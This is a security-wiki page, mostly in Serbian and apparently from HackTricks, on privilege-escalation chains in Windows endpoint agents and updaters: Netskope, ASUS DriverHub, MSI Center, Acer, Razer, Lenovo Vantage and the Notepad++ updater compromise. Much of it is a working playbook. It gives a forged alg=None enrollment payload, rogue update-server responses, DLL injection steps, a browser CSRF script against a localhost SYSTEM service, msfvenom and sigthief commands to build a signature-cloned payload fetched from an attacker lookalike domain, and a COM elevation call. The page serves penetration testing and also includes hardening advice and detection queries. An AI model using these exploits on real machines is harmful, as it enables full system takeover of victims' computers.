# Zloupotreba Enterprise Auto-Updaters i Privileged IPC (npr. Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Ova stranica generalizuje klasu Windows local privilege escalation lanaca pronađenih u enterprise endpoint agentima i updaterima koji izlažu low-friction IPC surface i privileged update flow. Reprezentativan primer je Netskope Client for Windows < R129 (CVE-2025-0309), gde low-privileged user može da natera enrollment ka serveru pod kontrolom napadača i zatim isporuči zlonameran MSI koji SYSTEM service instalira.

Ključne ideje koje možeš ponovo da iskoristiš protiv sličnih proizvoda:
- Zloupotrebi localhost IPC privilegovane usluge da bi naterao re-enrollment ili reconfiguration ka attacker serveru.
- Implementiraj update endpoints vendora, isporuči rogue Trusted Root CA, i usmeri updater ka zlonamernom, “signed” paketu.
- Zaobiđi slabe signer checks (CN allow-lists), opcionalne digest flags, i labave MSI properties.
- Ako je IPC “encrypted”, izvedi key/IV iz world-readable machine identifiers sačuvanih u registry.
- Ako service ograničava pozivaoce po image path/process name, injectuj u allow-listed process ili pokreni jedan suspendovan i pokreni svoj DLL preko minimalnog thread-context patch.

---
## 1) Prisiljavanje enrollment-a ka attacker serveru preko localhost IPC

Mnogi agenti isporučuju user-mode UI process koji komunicira sa SYSTEM service preko localhost TCP koristeći JSON.

Primećeno u Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Eksploit tok:
1) Napravi JWT enrollment token čiji claims kontrolišu backend host (npr. AddonUrl). Koristi alg=None tako da potpis nije potreban.
2) Pošalji IPC poruku koja poziva provisioning command sa tvojim JWT i tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Servis počinje da udara tvoj rogue server za enrollment/config, npr.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- Ako je caller verification zasnovan na path/name-u, pokreni request iz allow-listed vendor binary-ja (vidi §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Kada klijent počne da komunicira sa tvojim serverom, implementiraj očekivane endpoint-e i usmeri ga na attacker MSI. Tipičan sequence:

1) /v2/config/org/clientconfig → Vrati JSON config sa veoma kratkim updater intervalom, npr.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Vrati PEM CA certificate. Servis ga instalira u Local Machine Trusted Root store.
3) /v2/checkupdate → Pošalji metadata koja pokazuje na maliciozni MSI i lažnu verziju.

Zaobilaženje uobičajenih provera viđenih u praksi:
- Signer CN allow-list: servis može da proverava samo da Subject CN bude “netSkope Inc” ili “Netskope, Inc.”. Tvoj rogue CA može izdati leaf sa tim CN i potpisati MSI.
- CERT_DIGEST property: uključi benignu MSI property pod nazivom CERT_DIGEST. Nema enforcement-a pri instalaciji.
- Optional digest enforcement: config flag (npr. check_msi_digest=false) isključuje dodatnu kriptografsku validaciju.

Rezultat: SYSTEM servis instalira tvoj MSI iz
C:\ProgramData\Netskope\stAgent\data\*.msi
izvršavajući proizvoljan kod kao NT AUTHORITY\SYSTEM.

Patch-bypass lekcija: ako vendor odgovori tako što allow-listuje mali skup “trusted” domena umesto da kriptografski autentifikuje update source, traži vendor-owned redirectore ili reverse proxije koji i dalje omogućavaju da usmeravaš traffic. U Netskope-ovom slučaju, javno naknadno istraživanje je pokazalo da se R129-era allow-list i dalje mogla zloupotrebiti kroz `rproxy.goskope.com`, koji je proxijao sadržaj sa Azure App Service pod kontrolom napadača. Hostname allow-liste tretiraj kao usporivač, ne kao trust boundary.

---
## 3) Forging encrypted IPC requests (when present)

Od R127, Netskope je umotavao IPC JSON u encryptData field koji izgleda kao Base64. Reverse engineering je pokazao AES sa key/IV izvedenim iz registry vrednosti čitljivih svakom korisniku:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Napadači mogu da reprodukuju encryption i šalju validne encrypted komande iz standardnog user-a. Opšti savet: ako agent odjednom “encryptuje” svoj IPC, traži device IDs, product GUIDs, install IDs pod HKLM kao materijal.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Neki servisi pokušavaju da autentifikuju peer tako što rešavaju PID TCP konekcije i porede image path/name sa allow-listed vendor binary-jima koji se nalaze pod Program Files (npr. stagentui.exe, bwansvc.exe, epdlp.exe).

Dva praktična bypass-a:
- DLL injection u allow-listed process (npr. nsdiag.exe) i proxy IPC iznutra.
- Pokreni allow-listed binary suspended i bootstrapuj svoj proxy DLL bez CreateRemoteThread (vidi §5) da bi zadovoljio driver-enforced tamper pravila.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Proizvodi često dolaze sa minifilter/OB callbacks driver-om (npr. Stadrv) koji uklanja opasna prava sa handle-ova ka protected processes:
- Process: uklanja PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: ograničava na THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Pouzdan user-mode loader koji poštuje ova ograničenja:
1) CreateProcess vendor binary-ja sa CREATE_SUSPENDED.
2) Nabavi handle-ove koje još uvek smeš da koristiš: PROCESS_VM_WRITE | PROCESS_VM_OPERATION nad process-om, i thread handle sa THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ili samo THREAD_RESUME ako patchuješ code na poznatom RIP-u).
3) Prepiši ntdll!NtContinue (ili drugi rani, garantovano mapped thunk) malim stub-om koji poziva LoadLibraryW na path tvoje DLL, pa se vraća nazad.
4) ResumeThread da aktiviraš svoj stub u procesu, učitavajući tvoju DLL.

Pošto nikad nisi koristio PROCESS_CREATE_THREAD ili PROCESS_SUSPEND_RESUME nad već protected process-om (ti si ga kreirao), policy driver-a je zadovoljen.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatizuje rogue CA, potpisivanje malicioznog MSI-ja i servira potrebne endpoint-e: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope je custom IPC client koji kreira proizvoljne (opciono AES-encrypted) IPC poruke i uključuje suspended-process injection da bi poruke potekle iz allow-listed binary-ja.

## 7) Fast triage workflow for unknown updater/IPC surfaces

Kada se suočiš sa novim endpoint agent-om ili motherboard “helper” suite-om, brzi workflow je obično dovoljan da pokaže da li gledaš u obećavajući privesc target:

1) Enumeriši loopback listener-e i mapiraj ih nazad na vendor procese:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Nabroj candidate named pipes:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Ekstrahovati routing podatke iz registra koje koriste IPC serveri zasnovani na pluginima:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Prvo izdvoj endpoint nazive, JSON ključeve i command ID-jeve iz user-mode klijenta. Spakovani Electron/.NET frontendi često otkrivaju celu šemu:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Lovite stvarni trust predicate, ne samo code path koji na kraju pokreće proces:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Obrasci koje vredi prioritetno tražiti:
- `CryptQueryObject`/parsiranje sertifikata bez `WinVerifyTrust` obično znači da je „sertifikat postoji” tretirano kao „sertifikat je trusted”, što omogućava certificate cloning ili druge fake-signer trikove.
- Provere podstringa/prefiksa ili sufiksa nad `Origin`, `Referer`, URL-ovima za download, imenima procesa ili CN-ovima potpisnika nisu autentikacija. `contains(".vendor.com")` je obično exploitable pomoću domena nalik na original koji kontroliše napadač.
- Ako GUI sa niskim privilegijama odlučuje „fajl je trusted”, a SYSTEM broker samo troši taj rezultat, patchovanje ili reimplementacija client-side DLL/JS često potpuno zaobilazi granicu (Razer-style split validation).
- Ako broker kopira payload u `%TEMP%`/`C:\Windows\Temp` i onda ga validira ili zakazuje iz te putanje, odmah testiraj TOCTOU replacement windows i sibling plugin module koji izlažu alternativne `ExecuteTask()` wrapper-e sa slabijim proverama.

Za ciljeve koji se mnogo oslanjaju na named pipes, PipeViewer je brz način da uočiš slabe DACL-ove i pipe-ove dostupne udaljeno pre nego što kreneš da dubinski reverse-uješ protokol.

Ako cilj autentifikuje pozivaoce samo po PID-u, image path-u ili imenu procesa, tretiraj to kao usporivač, ne kao granicu: injektovanje u legitimni client, ili uspostavljanje konekcije iz allow-listed procesa, često je dovoljno da zadovolji provere servera. Za named pipes posebno, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) pokriva ovu primitivu detaljnije.

---
## 8) Modular add-in broker-i autentifikovani samo vendor signatures-ima (Lenovo Vantage pattern)

Novija varijacija koju vredi loviti je **signed-client RPC broker**: Lenovo-signed desktop proces sa niskim privilegijama komunicira sa SYSTEM servisom, a servis prosleđuje JSON komande u skup XML-opisanih add-in-ova pod `%ProgramData%`. Kada se postigne code execution **unutar bilo kog prihvaćenog signed client-a**, svaki `runas="system"` ugovor postaje deo attack surface-a.

High-value primitive u Lenovo Vantage istraživanju:
- **Poverenje u pozivaoca zato što je potpisan od strane vendora**: istraživači su došli do authenticated konteksta kopiranjem Lenovo-signed EXE u writable direktorijum i zadovoljavanjem DLL side-load-a (`profapi.dll`), tako da je arbitrary code radio unutar client-a kojem je servis već verovao.
- **Manifest-driven attack surface discovery**: add-in-ovi su deklarisani pod `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; nekoliko contract-ova radi kao `SYSTEM`, pa enumeracija tih manifest-a često otkriva stvarne privileged verbs brže nego reverse-engineering samog brokera.
- **Bug-ovi po komandi iza authenticated channel-a**: jednom kad si unutar trusted client-a, javno istraživanje je pronašlo path-traversal + race condition bug-ove u update/install verbs, raw-SQL abuse u privileged settings bazama, i substring-based provere registry path-ova koje su omogućavale upis van predviđenog hive-a.

Korisna recon informacija na meti:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Practical takeaway: whenever a helper suite exposes a broker that first authenticates the **caller process** and only then dispatches into dozens of plugin/add-in commands, do not stop after bypassing the front-door trust check. Dump the manifest/contract table and fuzz each high-privilege verb independently; the authenticated channel usually hides several second-stage bugs.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub isporučuje user-mode HTTP service (ADU.exe) na 127.0.0.1:53000 koji očekuje browser pozive koji dolaze sa https://driverhub.asus.com. Origin filter jednostavno radi `string_contains(".asus.com")` nad Origin headerom i nad download URL-ovima izloženim preko `/asus/v1.0/*`. Svaki host pod kontrolom napadača kao što je `https://driverhub.asus.com.attacker.tld` zato prolazi proveru i može da šalje state-changing requests iz JavaScript-a. Pogledaj [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) za dodatne bypass pattern-e.

Praktični flow:
1) Registruj domain koji sadrži `.asus.com` i hostuj malicioznu webpage tamo.
2) Koristi `fetch` ili XHR da pozoveš privilegovan endpoint (npr. `Reboot`, `UpdateApp`) na `http://127.0.0.1:53000`.
3) Pošalji JSON body koji handler očekuje – packed frontend JS prikazuje schema ispod.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Čak i PowerShell CLI prikazan ispod uspeva kada se Origin header lažira na poverenu vrednost:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` preuzima proizvoljne executables definisane u JSON body i kešira ih u `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Validacija download URL-a ponovo koristi istu substring logiku, tako da se `http://updates.asus.com.attacker.tld:8000/payload.exe` prihvata. Nakon preuzimanja, ADU.exe samo proverava da PE sadrži signature i da Subject string odgovara ASUS pre nego što ga pokrene – bez `WinVerifyTrust`, bez chain validation.

Da bi se flow pretvorio u weapon:
1) Napravite payload (npr. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Klonirajte ASUS-ov signer u njega (npr. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hostujte `pwn.exe` na `.asus.com` lookalike domeni i pokrenite UpdateApp kroz browser CSRF iznad.

Pošto su i Origin i URL filteri bazirani na substring-u, a provera signera poredi samo stringove, DriverHub preuzima i izvršava attacker binary pod svojim elevated context-om.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center-ov SYSTEM service izlaže TCP protocol gde je svaki frame `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Core component (Component ID `0f 27 00 00`) isporučuje `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Njegov handler:
1) Kopira prosleđeni executable u `C:\Windows\Temp\MSI Center SDK.exe`.
2) Proverava signature preko `CS_CommonAPI.EX_CA::Verify` (certificate subject mora biti „MICRO-STAR INTERNATIONAL CO., LTD.” i `WinVerifyTrust` mora uspeti).
3) Kreira scheduled task koji pokreće temp file kao SYSTEM sa attacker-controlled arguments.

Kopirani file nije zaključan između verifikacije i `ExecuteTask()`. Attacker može:
- Poslati Frame A koji pokazuje na legitimni MSI-signed binary (garantuje da signature check prođe i da se task queue-uje).
- Race-ovati ga ponovljenim Frame B porukama koje pokazuju na malicious payload, i prepisati `MSI Center SDK.exe` odmah nakon što verifikacija završi.

Kada scheduler okine, izvršava prepisani payload pod SYSTEM iako je originalni file bio validiran. Pouzdano iskorišćavanje koristi dve goroutine/thread-ove koji spam-uju CMD_AutoUpdateSDK dok se TOCTOU window ne dobije.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Svaki plugin/DLL učitan od strane `MSI.CentralServer.exe` dobija Component ID koji se čuva pod `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Prva 4 bajta frame-a biraju taj komponent, što attackerima omogućava da rutiraju komande ka proizvoljnim modulima.
- Pluginovi mogu da definišu svoje task runner-e. `Support\API_Support.dll` izlaže `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` i direktno poziva `API_Support.EX_Task::ExecuteTask()` bez **signature validation** – svaki lokalni user može da ga usmeri na `C:\Users\<user>\Desktop\payload.exe` i dobije SYSTEM execution deterministički.
- Sniffing loopback-a sa Wireshark-om ili instrumenting .NET binaries u dnSpy brzo otkriva Component ↔ command mapping; custom Go/ Python clients onda mogu da replay-ju frame-ove.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) izlaže `\\.\pipe\treadstone_service_LightMode`, a njegov discretionary ACL dozvoljava remote clients (npr. `\\TARGET\pipe\treadstone_service_LightMode`). Slanje command ID `7` sa file path-om poziva service-ovu process-spawning rutinu.
- Client library serijalizuje magic terminator byte (113) zajedno sa args. Dynamic instrumentation sa Frida/`TsDotNetLib` (vidi [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) za instrumentation savete) pokazuje da native handler mapira ovu vrednost na `SECURITY_IMPERSONATION_LEVEL` i integrity SID pre poziva `CreateProcessAsUser`.
- Zamena 113 (`0x71`) sa 114 (`0x72`) pada u generic branch koji zadržava puni SYSTEM token i postavlja high-integrity SID (`S-1-16-12288`). Pokrenuti binary zato radi kao unrestricted SYSTEM, i lokalno i cross-machine.
- Kombinujte to sa exposed installer flag-om (`Setup.exe -nocheck`) da podignete ACC čak i na lab VM-ovima i testirate pipe bez vendor hardware-a.

Ove IPC greške pokazuju zašto localhost servisi moraju da sprovode mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filteri, token filtering) i zašto svaki modulov helper za „run arbitrary binary“ mora da deli iste signer verifications.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 je dodao još jedan koristan pattern u ovu familiju: low-privileged user može da zamoli COM helper da pokrene process kroz `RzUtility.Elevator`, dok je trust odluka delegirana user-mode DLL-u (`simple_service.dll`) umesto da bude robusno enforced unutar privileged boundary-ja.

Observed exploitation path:
- Instantiate COM object `RzUtility.Elevator`.
- Pozovite `LaunchProcessNoWait(<path>, "", 1)` da zatražite elevated launch.
- U javnom PoC-u, PE-signature gate unutar `simple_service.dll` se patch-uje pre slanja request-a, što omogućava da se pokrene proizvoljni executable izabran od strane attacker-a.

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Opšti zaključak: kada analizirate „helper“ pakete, nemojte stati na localhost TCP ili named pipes. Proverite COM klase sa imenima kao što su `Elevator`, `Launcher`, `Updater` ili `Utility`, a zatim utvrdite da li privilegovani servis zaista validira sam ciljni binary ili samo veruje rezultatu koji je izračunao patchable user-mode client DLL. Ovaj obrazac važi i van Razer-a: svaki split dizajn u kojem high-privilege broker prihvata allow/deny odluku sa low-privilege strane kandidat je za privesc surface.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Između juna 2025. i decembra 2025. godine, napadači koji su kompromitovali hosting infrastrukturu iza Notepad++ update toka selektivno su isporučivali maliciozne manifeste izabranim žrtvama. Stariji WinGUp-based updaters nisu u potpunosti proveravali autentičnost update-a, pa je neprijateljski XML odgovor mogao da preusmeri klijente na URL-ove pod kontrolom napadača. Pošto je klijent prihvatao HTTPS sadržaj bez primene i trusted certificate chain i validnog PE signature na preuzetom installer-u, žrtve su preuzimale i izvršavale trojanized NSIS `update.exe`.

Operativni tok (nije potreban lokalni exploit):
1. **Infrastructure interception**: kompromitujte CDN/hosting i odgovorite na update provere sa attacker metadata koji pokazuje na maliciozni download URL.
2. **Trojanized NSIS**: installer preuzima/izvršava payload i zloupotrebljava dva execution chain-a:
- **Bring-your-own signed binary + sideload**: ubacite signed Bitdefender `BluetoothService.exe` i postavite maliciozni `log.dll` u njegov search path. Kada se signed binary pokrene, Windows sideloads `log.dll`, koji dekriptovuje i reflectively učitava Chrysalis backdoor (Warbird-protected + API hashing da oteža statičku detekciju).
- **Scripted shellcode injection**: NSIS izvršava kompajlirani Lua script koji koristi Win32 APIs (npr. `EnumWindowStationsW`) da injektuje shellcode i postavi Cobalt Strike Beacon.

Hardening/detection takeaways za bilo koji auto-updater:
- Primorajte **certificate + signature verification** preuzetog installer-a (pin vendor signer, odbacite nepodudarajući CN/chain) i potpisujte sam update manifest (npr. XMLDSig). Blokirajte redirects koje kontroliše manifest osim ako nisu validirane.
- Tretirajte **BYO signed binary sideloading** kao post-download detection pivot: alarmirajte kada signed vendor EXE učitava DLL ime izvan svog kanonskog install path-a (npr. Bitdefender učitava `log.dll` iz Temp/Downloads) i kada updater dropuje/izvršava installere iz temp sa non-vendor signatures.
- Pratite **malware-specific artifacts** opažene u ovom lancu (korisno kao generični pivoti): mutex `Global\Jdhfv_1.0.1`, anomalous `gup.exe` writes to `%TEMP%`, i Lua-driven shellcode injection stages.
- Notepad++ je odgovorio jačanjem WinGUp u v8.8.9 i novijim verzijama: vraćeni XML je sada potpisan (XMLDSig), a novije build-ove primenjuju certificate + signature verification preuzetog installer-a umesto oslanjanja samo na transport.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> pokreće instalater koji nije Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Ovi obrasci se generalizuju na bilo koji updater koji prihvata unsigned manifests ili ne uspeva da pin-uje signere instalera—network hijack + malicious installer + BYO-signed sideloading dovodi do remote code execution pod maskom “trusted” updatea.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
